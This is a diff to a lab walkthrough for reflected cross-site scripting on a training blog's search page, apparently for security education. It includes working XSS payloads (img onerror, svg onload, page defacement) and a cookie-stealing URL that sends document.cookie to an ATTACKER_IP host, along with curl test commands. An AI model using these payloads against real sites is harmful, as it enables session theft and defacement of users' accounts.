@@ -1,7 +1,8 @@
 # XSS Lab Walkthrough
 
 > **Lab URL:** http://10.10.61.221/search/
-> **Business Name:** Tech Blog
+> **Search Endpoint:** http://10.10.61.221/search/search?q=
+> **Business Name:** ByteWise Developer Blog
 > **Last Verified:** March 2026
 
 ---
@@ -30,8 +31,8 @@ This lab focuses on **Reflected XSS**.
 
 ```
 ┌──────────────┐     ┌─────────────────┐     ┌──────────────────┐
-│   Attacker   │────►│    Tech Blog    │────►│     Victim       │
-│  Crafts URL  │     │    /search/     │     │  Clicks Link     │
+│   Attacker   │────►│ ByteWise Blog   │────►│     Victim       │
+│  Crafts URL  │     │ /search/search  │     │  Clicks Link     │
 └──────────────┘     │  (loc_xss_lab)  │     └──────────────────┘
                      │    Port 3000    │              │
                      └─────────────────┘              ▼
@@ -47,11 +48,11 @@ This lab focuses on **Reflected XSS**.
 ## Step 1: Explore the Search Feature
 
 1. Go to http://10.10.61.221/search/
-2. You'll see a "Tech Blog" with a search box
+2. You'll see "ByteWise Developer Blog" with a search box in the navbar
 3. Try a normal search: `javascript`
 4. Notice the search term appears in:
-   - The URL: `/search/?q=javascript`
-   - The page: "Results for: javascript"
+   - The URL: `/search/search?q=javascript`
+   - The page: "Showing results for: javascript"
    - The search box value
 
 ---
@@ -87,7 +88,7 @@ This bypasses the filter because it doesn't use script tags.
 
 URL:
 ```
-http://10.10.61.221/search/?q=<script>alert('XSS')</script>
+http://10.10.61.221/search/search?q=<script>alert('XSS')</script>
 ```
 
 ### Alert with Domain
@@ -114,7 +115,7 @@ http://10.10.61.221/search/?q=<script>alert('XSS')</script>
 
 URL:
 ```
-http://10.10.61.221/search/?q=<img src=x onerror=alert('XSS')>
+http://10.10.61.221/search/search?q=<img src=x onerror=alert('XSS')>
 ```
 
 ### SVG Tag
@@ -178,12 +179,12 @@ Or using Image object:
 ### Step 5.3: Create Malicious URL
 
 ```
-http://10.10.61.221/search/?q=<img src=x onerror="fetch('http://ATTACKER_IP:8888/?c='+document.cookie)">
+http://10.10.61.221/search/search?q=<img src=x onerror="fetch('http://ATTACKER_IP:8888/?c='+document.cookie)">
 ```
 
 URL encode it:
 ```
-http://10.10.61.221/search/?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27http%3A%2F%2FATTACKER_IP%3A8888%2F%3Fc%3D%27%2Bdocument.cookie)%22%3E
+http://10.10.61.221/search/search?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27http%3A%2F%2FATTACKER_IP%3A8888%2F%3Fc%3D%27%2Bdocument.cookie)%22%3E
 ```
 
 ### Step 5.4: Send to Victim
@@ -365,14 +366,16 @@ echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
 ## Quick Verification Commands
 
 ```bash
-# Test search endpoint
+# Test search homepage
 curl -s 'http://10.10.61.221/search/'
 
-# Test XSS (check if script tags are in response)
-curl -s 'http://10.10.61.221/search/?q=<script>alert(1)</script>' | grep -i script
+# Test search endpoint with query
+curl -s 'http://10.10.61.221/search/search?q=test' | grep "Showing results"
 
-# Test img tag payload
-curl -s 'http://10.10.61.221/search/?q=<img%20src=x%20onerror=alert(1)>'
+# Test XSS (check if img tag is reflected unescaped)
+curl -s 'http://10.10.61.221/search/search?q=<img%20src=x%20onerror=alert(1)>' | grep "<img src=x"
+
+# Note: <script> tags are filtered, but <img> works!
 ```
 
 ---
@@ -432,15 +435,13 @@ curl -s 'http://10.10.61.221/search/?q=<img%20src=x%20onerror=alert(1)>'
 **Note:** `<script>` tags are filtered! Use alternative event handlers.
 
 ```html
-<!-- These WORK on /search/?q= -->
+<!-- These WORK on /search/search?q= -->
 
 <img src=x onerror=alert(1)>
 
 <img src=x onerror=alert(document.cookie)>
 
 <svg onload=alert('XSS')>
-
-<body onload=alert('XSS')>
 
 <img src=x onerror="document.body.innerHTML='<h1>HACKED</h1>'">
 
@@ -450,9 +451,14 @@ curl -s 'http://10.10.61.221/search/?q=<img%20src=x%20onerror=alert(1)>'
 <script>alert(1)</script>
 ```
 
-**Best payload for this lab:**
+**Best payload for this lab (open in browser):**
 ```
-http://10.10.61.221/search/?q=<img src=x onerror=alert(document.domain)>
+http://10.10.61.221/search/search?q=<img src=x onerror=alert(document.domain)>
+```
+
+**URL-encoded version:**
+```
+http://10.10.61.221/search/search?q=%3Cimg%20src=x%20onerror=alert(document.domain)%3E
 ```
 
 ---
